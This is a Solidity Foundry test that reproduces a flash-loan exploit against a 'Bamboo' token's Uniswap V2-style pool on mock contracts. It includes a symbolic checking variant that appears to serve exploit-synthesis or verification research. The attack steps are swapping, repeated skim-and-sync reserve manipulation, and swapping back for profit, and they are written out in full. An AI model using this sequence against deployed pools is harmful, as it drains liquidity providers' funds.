// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {AttackContract} from "./AttackContract.sol";
import {Bamboo} from "./Bamboo.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
import {WBNB} from "@utils/WBNB.sol";
import {WETH} from "@utils/WETH.sol";

contract BambooTestBase is Test, BlockLoader {
    WBNB wbnb;
    Bamboo bamboo;
    WETH weth;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address wbnbAddr;
    address bambooAddr;
    address wethAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1688472383;
    uint112 reserve0pair = 235125000000000000000;
    uint112 reserve1pair = 148767611111032737560;
    uint32 blockTimestampLastpair = 1688472028;
    uint256 kLastpair = 35013051562481572078125000000000000000000;
    uint256 price0CumulativeLastpair = 541367028993581051945072285042658728331;
    uint256 price1CumulativeLastpair = 1349675471648387786249899025951271188049;
    uint256 totalSupplywbnb = 2605145138648414925102441;
    uint256 balanceOfwbnbpair = 235125000000000000000;
    uint256 balanceOfwbnbattacker = 0;
    uint256 totalSupplybamboo = 1000000000000000000000;
    uint256 balanceOfbamboopair = 148767611111032737560;
    uint256 balanceOfbambooattacker = 0;

    function setUp() public {
        owner = address(this);
        weth = new WETH();
        wethAddr = address(weth);
        wbnb = new WBNB();
        wbnbAddr = address(wbnb);
        bamboo = new Bamboo();
        bambooAddr = address(bamboo);
        pair = new UniswapV2Pair(
            address(wbnb),
            address(bamboo),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(weth),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(weth));
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        wbnb.transfer(address(pair), balanceOfwbnbpair);
        bamboo.transfer(address(pair), balanceOfbamboopair);
        bamboo.afterDeploy(address(router), address(pair), address(factory));
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Wbnb Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(wbnb),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(bamboo),
            address(wbnb),
            bamboo.decimals()
        );
        emit log_string("");
        emit log_string("Bamboo Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(bamboo),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(bamboo),
            address(bamboo),
            bamboo.decimals()
        );
        emit log_string("");
        emit log_string("Weth Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(weth),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(bamboo),
            address(weth),
            bamboo.decimals()
        );
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(pair),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(bamboo),
            address(pair),
            bamboo.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(attacker),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(bamboo),
            address(attacker),
            bamboo.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return wbnb.balanceOf(attacker) >= 1e6 + balanceOfwbnbattacker;
    }

    function borrow_wbnb_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        wbnb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_wbnb_owner(uint256 amount) internal eurus {
        wbnb.transfer(owner, amount);
    }

    function borrow_bamboo_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        bamboo.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_bamboo_owner(uint256 amount) internal eurus {
        bamboo.transfer(owner, amount);
    }

    function swap_pair_attacker_wbnb_bamboo(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        wbnb.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_bamboo_wbnb(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        bamboo.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function burn_bamboo_pair(uint256 amount) internal eurus {
        bamboo.transfer(address(pair), amount);
        pair.skim(attacker);
        pair.sync();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        borrow_wbnb_owner(4000 ether);
        printBalance("After step0 ");
        swap_pair_attacker_wbnb_bamboo(
            134890849999929463804,
            pair.getAmountOut(134890849999929463804, address(wbnb))
        );
        printBalance("After step1 ");
        burn_bamboo_pair(20533870967101818317);
        printBalance("After step2 ");
        burn_bamboo_pair(20533870967101818317);
        printBalance("After step3 ");
        burn_bamboo_pair(20533870967101818317);
        printBalance("After step4 ");
        swap_pair_attacker_bamboo_wbnb(
            bamboo.balanceOf(attacker),
            pair.getAmountOut(bamboo.balanceOf(attacker), address(bamboo))
        );
        printBalance("After step5 ");
        payback_wbnb_owner(4000 ether);
        printBalance("After step6 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt8 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_bamboo(amt1, amt2);
        burn_bamboo_pair(amt3);
        burn_bamboo_pair(amt4);
        burn_bamboo_pair(amt5);
        swap_pair_attacker_bamboo_wbnb(amt6, amt7);
        payback_wbnb_owner(amt8);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
